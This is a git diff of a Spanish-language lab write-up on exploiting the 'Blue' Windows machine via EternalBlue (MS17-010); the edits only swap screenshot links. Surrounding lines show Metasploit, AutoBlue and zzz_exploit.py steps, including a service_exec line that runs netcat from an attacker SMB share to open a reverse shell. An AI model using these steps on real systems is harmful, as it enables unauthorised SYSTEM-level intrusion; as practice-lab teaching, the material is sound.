@@ -19,7 +19,7 @@ Primeramente vamos a lanzar una _traza ICMP_ para saber si la máquina está act
 ping -c 1 <IP del host>
 ```
 
-![2](http://192.168.92.128:80/2.png){:class="blog-image" onclick="expandImage(this)"}
+![2](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/2.png){:class="blog-image" onclick="expandImage(this)"}
 
 Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del _TTL_; en este caso el valor del _TTL_ de la máquina es `128`, por lo que podemos intuir que estamos ante una máquina _Windows_. Recordemos que algunos de los valores referenciales son los siguientes:
 
@@ -195,7 +195,7 @@ set RHOST <IP del host>
 exploit
 ```
 
-![11](http://192.168.92.128:80/11.png){:class="blog-image" onclick="expandImage(this)"}
+![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/11.png){:class="blog-image" onclick="expandImage(this)"}
 
 La ejecución del módulo nos devuelve una sesión `Meterpreter` desde la cual podemos interactuar con el sistema comprometido. Desde esta sesión es posible invocar una shell interactiva. 
 
@@ -203,7 +203,7 @@ La ejecución del módulo nos devuelve una sesión `Meterpreter` desde la cual p
 shell
 ```
 
-![12](http://192.168.92.128:80/12.png){:class="blog-image" onclick="expandImage(this)"}
+![12](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/12.png){:class="blog-image" onclick="expandImage(this)"}
 
 Al verificar el contexto de ejecución, observamos que el proceso se ejecuta como `NT AUTHORITY\SYSTEM`, es decir, con los máximos privilegios del sistema. Por tanto, no es necesario realizar ninguna escalada de privilegios adicional.
 
@@ -239,7 +239,7 @@ nc -nlvp 443
 
 Una vez confirmada la escucha y continuada la ejecución, el exploit se ejecutará y obtendremos una shell interactiva dentro de la máquina víctima.
 
-![13](http://192.168.92.128:80/13.png){:class="blog-image" onclick="expandImage(this)"}
+![13](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/13.png){:class="blog-image" onclick="expandImage(this)"}
 
 ##### [](#header-5)AutoBlue
 
@@ -259,7 +259,7 @@ Una vez clonado el proyecto, nos situamos dentro del directorio y accedemos a la
 
 Desde el menú interactivo seleccionaremos la opción para generar el `shellcode` con `MSFvenom`. Indicaremos nuestra dirección IP y, dado que el script no detecta automáticamente la arquitectura del sistema objetivo, nos solicitará el puerto en el que nos pondremos en escucha tanto para _64 bits_ como para 32 bits. Asimismo, seleccionaremos la opción para generar una shell interactiva en lugar de una sesión _Meterpreter_ y especificaremos que el payload sea de tipo _stageless_.
 
-![14](http://192.168.92.128:80/14.png){:class="blog-image" onclick="expandImage(this)"}
+![14](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/14.png){:class="blog-image" onclick="expandImage(this)"}
 
 Una vez generado el _shellcode_, regresamos al directorio principal. Antes de ejecutar el exploit, debemos ponernos en escucha en el puerto previamente configurado, desde una nueva terminal:
 
@@ -275,7 +275,7 @@ Utilizaremos únicamente el `shellcode` de _64 bits_, ya que corresponde a la ar
 python eternalblue_exploit7.py <IP del host> shellcode/sc_x64.bin
 ```
 
-![15](http://192.168.92.128:80/15.png){:class="blog-image" onclick="expandImage(this)"}
+![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/15.png){:class="blog-image" onclick="expandImage(this)"}
 
 
 ##### [](#header-5)MS17-010
@@ -298,19 +298,19 @@ Una vez clonado el proyecto, nos situamos dentro del directorio. En primer lugar
 python2 checker.py
 ```
 
-![16](http://192.168.92.128:80/16.png){:class="blog-image" onclick="expandImage(this)"}
+![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/16.png){:class="blog-image" onclick="expandImage(this)"}
 
 Aunque las _null sessions_ están habilitadas, será necesario editar el script para especificar un usuario válido, por ejemplo `guest`. No será necesario indicar contraseña. Una vez realizado este ajuste, ejecutaremos nuevamente el script y se nos mostrarán los `named pipes` disponibles que podremos utilizar durante la explotación.
 
-![17](http://192.168.92.128:80/17.png){:class="blog-image" onclick="expandImage(this)"}
+![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/17.png){:class="blog-image" onclick="expandImage(this)"}
 
-![18](http://192.168.92.128:80/18.png){:class="blog-image" onclick="expandImage(this)"}
+![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/18.png){:class="blog-image" onclick="expandImage(this)"}
 
 Por defecto, el script `zzz_exploit.py` crea un archivo pwned.txt en la máquina víctima, lo cual no nos resulta especialmente útil. Lo que haremos ahora será modificar este script, concretamente la función `smb_pwn()`.
 
 En primer lugar, especificaremos un usuario válido, de forma similar a como hicimos previamente con `checker.py`.
 
-![19](http://192.168.92.128:80/19.png){:class="blog-image" onclick="expandImage(this)"}
+![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/19.png){:class="blog-image" onclick="expandImage(this)"}
 
 A continuación, comentaremos las líneas relacionadas con la creación del archivo y habilitaremos la llamada a `service_exec()`, adaptándola a nuestras necesidades.
 
@@ -322,7 +322,7 @@ Para conseguir esto, la llamada a `service_exec()` quedará de la siguiente form
 service_exec(conn, r'cmd /c \\<IP local>\smbFolder\nc64.exe -e cmd <IP local> 443')
 ```
 
-![20](http://192.168.92.128:80/20.png){:class="blog-image" onclick="expandImage(this)"}
+![20](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/20.png){:class="blog-image" onclick="expandImage(this)"}
 
 Una vez modificado el script, el siguiente paso será descargar el binario de [Netcat](https://eternallybored.org/misc/netcat/) que vamos a compartir.
 
@@ -346,4 +346,4 @@ python2 zzz_exploit.py <IP del host> samr
 
 De esta forma, obtendremos una shell interactiva dentro de la máquina víctima con privilegios máximos, ejecutándose como `NT AUTHORITY\SYSTEM`.
 
-![21](http://192.168.92.128:80/21.png){:class="blog-image" onclick="expandImage(this)"}
+![21](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/21.png){:class="blog-image" onclick="expandImage(this)"}
